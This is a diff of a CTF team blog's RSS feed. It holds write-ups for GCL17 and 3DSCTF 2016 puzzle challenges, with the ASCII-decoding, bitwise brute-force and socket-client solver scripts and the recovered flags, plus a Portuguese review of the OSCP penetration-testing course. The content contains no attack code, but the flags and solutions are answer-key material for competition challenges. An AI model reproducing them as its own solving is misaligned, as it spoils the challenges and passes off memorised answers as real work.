+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;t0k3n1 = [116, 104, 51, 32, 120, 120, 120, 32, 116, 48, 107, 51, 110, 32, 121,
+          48, 117, 32, 115, 51, 51, 107, 32, 105, 115, 58, 32, 102, 48, 108,
+          108, 48, 119, 32, 116, 104, 51, 32, 114, 52, 98, 98, 49, 116]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And to get the ascii, I write the resolv.py&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;t0k3n1 = [116, 104, 51, 32, 120, 120, 120, 32, 116, 48, 107, 51, 110, 32, 121,
+          48, 117, 32, 115, 51, 51, 107, 32, 105, 115, 58, 32, 102, 48, 108,
+          108, 48, 119, 32, 116, 104, 51, 32, 114, 52, 98, 98, 49, 116]
+out = list()
+for l in t0k3n1:
+    out.append(chr(l))
+print &apos;&apos;.join(out)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;FLAG: th3 xxx t0k3n y0u s33k is: f0ll0w th3 r4bb1t&lt;/p&gt;
+
+&lt;h3 id=&quot;write-up-austria&quot;&gt;Write Up AUSTRIA&lt;/h3&gt;
+&lt;p&gt;Continuing with this file after the CTF, I just read the rest of the file and found that if I created I file with the coordinates, it will print the flag to me, so debugging the pyi_darchive, I created the file uKBcWeOjxleffzzZmpWXLUrSubOHWzaeVO.wgz, and put the coordinates inside it, because the script compares the content of the file with the values on coords var, so the file looks like that&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ cat uKBcWeOjxleffzzZmpWXLUrSubOHWzaeVO.wgz
+33.744970 -84.372165
+52.369561 4.893806
+38.905475 -77.031695
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I just run the script, and then here is the flag,&lt;/p&gt;
+
+&lt;p&gt;FLAG: the yyy t0k3n y0u s33k is: d33p_1n_th3_0z4rks&lt;/p&gt;
+</description>
+        <pubDate>Sat, 12 Aug 2017 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/2017/GCL17-SRI-LANKA-AND-AUSTRIA</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/GCL17-SRI-LANKA-AND-AUSTRIA</guid>
+        
+        <category>GCL17</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>PWK [OSCP] - The [a]way to success!</title>
+        <description>&lt;h3 id=&quot;sobre-o-pwk-oscp---the-away-to-success&quot;&gt;Sobre o PWK [OSCP] - The [a]way to success!&lt;/h3&gt;
+
+&lt;p&gt;Bom… resolvi escrever esse pequeno texto e dar minha opinião sobre o reconhecido curso da Offensive Security, o PWK, um dos cursos mais desafiadores aí entre os cursos de “intro” no desenvolvimento das técnicas que um profissional precisa ter para executar testes de invasão (pentest). 
+Primeiramente, se o leitor pensa que este é um curso e prova para poucos e que ele tem um nível de dificuldade muito elevado, em resposta curta podemos afirmar que talvez e não. Na realidade o curso não é difícil. Ele é complicado, trabalhoso e exige boas horas investidas para conseguir resultado. A prova é difícil, mas apenas se você não se preparar bem. Não é uma prova impossível (na realidade, é de longe a prova mais divertida que eu já fiz até o momento). É um curso muito interessante e que valeu muito o investimento, então recomendo, por exemplo, que entre CEH e OSCP as pessoas escolham pelo OSCP.&lt;/p&gt;
+
+&lt;h3 id=&quot;o-curso&quot;&gt;O Curso&lt;/h3&gt;
+&lt;p&gt;O curso nada mais é que a reserva de um período para acesso ao laboratório de treinamento (contendo em torno de 60 sistemas vulneráveis) + material de estudos (vídeos e PDF). 
+Não tem instrutor nenhum, apenas você e o suporte da OffSec. 
+O material é bem completo mas o conhecimento aplicado no laboratório exige uns 40% a mais do que está no material. Não é um curso indicado para quem não consegue aprender por conta (e nunca vai ser). A ideia por trás do curso é que você consiga entender conceitos e adaptar aos diferentes cenários que um pentester pode enfrentar, sem que alguém diga o que deve ser feito. Um outro detalhe importante é que há uma recomendação forte de que o estudante saiba razoavelmente Inglês, já que tudo no curso é 100% na língua inglesa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://www.offensive-security.com/images/pwk-lab-net-intro1.png&quot; alt=&quot;PWK Laboratório&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;tempo-de-curso&quot;&gt;Tempo de Curso&lt;/h3&gt;
+&lt;p&gt;Eu passei alguns meses aguardando o melhor momento para fazer o curso, pelos reviews que lemos em inglês podemos chegar à conclusão de que há uma necessidade muito grande de dedicação de horas para completar os desafios, então escolhi, e recomendo, pegar o período de férias de trabalho/faculdade/escola.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Agendei o inicio do curso para 25 de dezembro de 2016, reservando 60 dias de curso, como o pessoal indica.&lt;/li&gt;
+  &lt;li&gt;Durante as férias, dediquei de 8 a 10 horas do dia pwning no laboratório. As férias duraram 2 semanas, logo em seguida tive que voltar ao trabalho, então passei a dedicar de 5 a 6 horas por dia. Os fins de semana foram todos fazendo lab. 
+Levando esse ritmo, é possível comprometer todos os alvos disponíveis no laboratório com uma sobra de 2 semanas para acabar o tempo de acesso.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;a-prova&quot;&gt;A prova&lt;/h3&gt;
+&lt;p&gt;Não posso dar muitos detalhes sobre a prova, o que posso afirmar com certeza é que foi a prova mais divertida que eu já fiz até o momento. É melhor do que qualquer prova escrita/assinalada, é o tipo de prova que te faz sentir, ao final, que você realmente superou uma barreira, e isso é sensacional. A prova tem o total 48 horas. São 24 horas dedicadas a uma prova prática baseada no laboratório do curso, em seguida, mais 24 horas dedicadas a elaboração de um relatório detalhado das atividades executadas na prova e dos resultados obtidos.&lt;/p&gt;
+
+&lt;p&gt;Eu tive que fazer a prova duas vezes. Na primeira, eu cometi alguns erros e acabei não atingido a nota que precisava. O principal erro foi não documentar devidamente o processo todo. O segundo erro foi não ter “try harder” e ter apagado no meio da prova, perdendo muito tempo. 
+Cronograma básico do que rolou:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Hr&lt;/th&gt;
+      &lt;th&gt;comment&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10:00 am&lt;/td&gt;
+      &lt;td&gt;Comecei a prova.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;11:50 am&lt;/td&gt;
+      &lt;td&gt;Marquei 30% da pontuação.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;16:00 pm&lt;/td&gt;
+      &lt;td&gt;Marquei 60% da pontuação.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22:00 pm&lt;/td&gt;
+      &lt;td&gt;Saí do computador pra andar e descansar.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;00:30 am&lt;/td&gt;
+      &lt;td&gt;Capotei.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;05:40 am&lt;/td&gt;
+      &lt;td&gt;Voltei pra prova.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;06:30 am&lt;/td&gt;
+      &lt;td&gt;Marquei 70% da pontuação (agora eu conseguiria passar).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;09:45 am&lt;/td&gt;
+      &lt;td&gt;Fim da prova.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Depois dessas 24 hrs eu voltei para documentar, já tendo em mente que talvez tivesse que fazer novamente a prova. Apesar de saber que talvez não tinha passado, ainda valeu a pena ter enviado toda a documentação. O pessoal me deu uma resposta compreensiva sobre o que eu deveria melhorar ou tomar cuidado na próxima prova.&lt;/p&gt;
+
+&lt;p&gt;Na segunda tentativa, eu comecei a prova as 10am e fiz mais da pontuação que precisava em menos de 12 horas, depois documentei tudo com maior profundidade e detalhamento. 
+A resposta pode vir em até 3 dias úteis, mas normalmente já vem no dia seguinte.&lt;/p&gt;
+
+&lt;p&gt;Meu conhecimento e experiência: 
+Eu trabalho há um tempo com segurança da informação e já trabalhei com programação e com redes no passado, então tenho uma certa facilidade em entender cenários e códigos com até certo grau de complexidade. Entendo a que todos que gostam muito de estudar e que se dediquem de verdade possam fazer o curso, desde que estejam dispostos a perder algumas noites de sono. Então, se estiver interessado em fazer o curso, o mais importante é ter um bom entendimento de alguns conceitos e de técnicas de exploração. Algumas das fontes que podem ser utilizadas como referência do que é preciso saber:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X/ref=sr_1_1?ie=UTF8&amp;amp;qid=1492297200&amp;amp;sr=8-1&amp;amp;keywords=metasploit&quot;&gt;Metasploit: The Penetration Tester’s Guide&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.amazon.com/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641/ref=sr_1_3?ie=UTF8&amp;amp;qid=1492297153&amp;amp;sr=8-3&amp;amp;keywords=pentest&quot;&gt;Penetration Testing: A Hands-On Introduction to Hacking&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/ref=sr_1_1?ie=UTF8&amp;amp;qid=1492297164&amp;amp;sr=8-1&amp;amp;keywords=hacking&quot;&gt;Hacking: The Art of Exploitation, 2nd Edition&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/ref=sr_1_2?ie=UTF8&amp;amp;qid=1492297153&amp;amp;sr=8-2&amp;amp;keywords=pentest&quot;&gt;Rtfm: Red Team Field Manual&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/ref=sr_1_1?ie=UTF8&amp;amp;qid=1492297179&amp;amp;sr=8-1&amp;amp;keywords=the+web+application+hacker%27s+handbook&quot;&gt;The Web Application Hacker’s Handbook: Finding and Exploiting Security Flaws&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Além desses livros, eu recomendo ler artigos e estar atualizado com o que está em discussão pela comunidade.&lt;/p&gt;
+
+&lt;p&gt;No geral, o curso é muito bom e realmente te faz sentir que uma meta foi atingida, mas também não é nada muito complexo. Eu conheço muitas pessoas que manjam muito mais do que é cobrado no curso e que ficam dizendo que o curso é difícil, quando na verdade não é tão complexo assim. Meu objetivo com esse post foi deixar meu relato e meu agradecimento ao pessoal da Offensive Security (porque sempre estiveram no IRC pra me dizer “try harder”, bando de #@$#@!@#!@ :P). Espero também que eu possa, de alguma forma, ter ajudado qualquer pessoa atrás de informações sobre o curso, mesmo sabendo que já existem muitos posts sobre o curso na internet, eu decidi escrever esse em pt_br para galera pt_br que quer matar esse chall. Não me fez melhor que ninguém e não vai fazer ninguém melhor que ninguém. Na cena de sec, a OSCP é uma certificação bem diferente das outras e vale a pena estudar.&lt;/p&gt;
+
+&lt;p&gt;away.ca&lt;/p&gt;
+
+&lt;p&gt;Outros reviews:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://blog.andradesoto.com.br/archives/2013/08/19/certificacao-oscp/&quot;&gt;http://blog.andradesoto.com.br/archives/2013/08/19/certificacao-oscp/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://buffered.io/posts/oscp-and-me/&quot;&gt;http://buffered.io/posts/oscp-and-me/&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 15 Apr 2017 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/2017/PWN-PATH-TO-OSCP</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/PWN-PATH-TO-OSCP</guid>
+        
+        <category>OSCP</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>3DSCTF 2016 - Results Does Not Matter (PPC - level 1)</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; 3DSCTF 2016 - &lt;a href=&quot;https://3dsctf.win&quot;&gt;https://3dsctf.win&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; Results Does Not Matter (PPC - level 1)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Author:&lt;/strong&gt; Eduardo EASH&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Description:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Results does not matter!!!&lt;br /&gt;
+[EN]&lt;br /&gt;
+Santa got a paper with strange stuff on it.&lt;br /&gt;
+There was a hint on the bottom: “Use 32 bit”&lt;br /&gt;
+He have no idea what’s this about.&lt;br /&gt;
+Can you help him to reveal the flag?&lt;br /&gt;
+Flag format: 3DS{sha256(FLAG)}&lt;/p&gt;
+
+&lt;p&gt;[PT-BR]&lt;br /&gt;
+O papai Noel recebeu uma papel com um desenho estranho.&lt;br /&gt;
+No rodape estava escrito: “Use 32 bits”&lt;br /&gt;
+Ele nao faz a minima ideia do que se trata.&lt;br /&gt;
+Voce pode ajuda-lo?&lt;br /&gt;
+Flag no formato: 3DS{sha256(FLAG)}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Temos o seguinte circuito:&lt;br /&gt;
+&lt;img src=&quot;https://github.com/rtfm-ctf/rtfm-ctf.github.io/blob/master/assets/3DS_RESULTS_CHALL.PNG&quot; alt=&quot;Results Does Not Matter - 3DSCTF 2016 - EASHian Circuit :3&quot; title=&quot;Challenge&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;O mestre EASH, aka: Papai Noel :3 nos disse que era para utilizar 32-bits, então limitaremos nosso brute conforme orientação superior (brutespace = 2 ^ 32). Montei um script em python a seguir para me ajudar a encontrar o valor correto que fornece a saída correta para que o circuito seja mais 1337) para a tão esperada flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+Solved by: RTFM[ChOkO]
+&quot;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;hash_object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;hex_dig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex_dig&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;n1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x200&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;n2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;318&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;n3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b1010001111100001000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;334453&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;brutespace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sha&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;brutespace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n1&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;f2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n2&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;f3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n3&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;#print &quot;%s\t%s&quot; % (flag,f3)
+&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;sha&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%s &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; 3DS {\%s}&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sha&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 17 Dec 2016 00:00:00 -0200</pubDate>
+        <link>http://localhost:4000/2016/RESULTS-DOES-NOT-MATTER-3DSCTF-2016</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/RESULTS-DOES-NOT-MATTER-3DSCTF-2016</guid>
+        
+        <category>3DSCTF</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>3DSCTF 2016 - Different and Notorious Alignment (PPC - level 2)</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; 3DSCTF 2016 - &lt;a href=&quot;https://3dsctf.win&quot;&gt;https://3dsctf.win&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; different_and_notorious_alignment (level 2)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Author:&lt;/strong&gt; j3r3mias&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Description: &lt;em&gt;[PT-BR] Acesse o servidor em 54.175.35.248:80&lt;/em&gt;
+&lt;em&gt;**&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+Solved by: RTFM[ChOkO]
+&quot;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#coding:utf-8
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;countDiff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;diffz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tamX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tamY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tamX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;T&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;G&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;C&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[%s] != [%s]&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;diffz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diffz&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;54.175.35.248&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8001&lt;/span&gt;
+
